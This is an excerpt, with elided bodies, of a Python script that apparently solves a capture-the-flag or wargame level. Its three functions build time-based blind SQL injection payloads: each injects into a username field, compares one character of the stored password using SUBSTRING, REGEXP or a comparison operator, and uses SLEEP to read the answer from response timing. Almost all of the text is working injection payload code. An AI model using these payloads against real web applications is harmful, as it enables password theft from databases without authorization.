...
def char_is_alpha(pos: int, credentials: tuple[str, str]) -> bool:
    ...
    """
    payload = {
        'username': f'{LEVEL_NEXT}" AND SUBSTRING(password, {pos}, 1) REGEXP "[a-zA-Z]" AND SLEEP({SUCCESS_SECONDS}) -- '
    }
...
def password_char_greater_than(pos: int, char: str, credentials: tuple[str, str]) -> bool:
    ...
    """
    payload = {
        'username': f'{LEVEL_NEXT}" AND SUBSTRING(password, {pos}, 1) > "{char}" AND SLEEP({SUCCESS_SECONDS}) -- '
    }
...
def confirm_char(pos: int, char: str, credentials: tuple[str, str]) -> bool:
    ...
    """
    payload = {
        'username': f'{LEVEL_NEXT}" AND BINARY SUBSTRING(password, {pos}, 1) = "{char}" AND SLEEP({SUCCESS_SECONDS}) -- '
    }
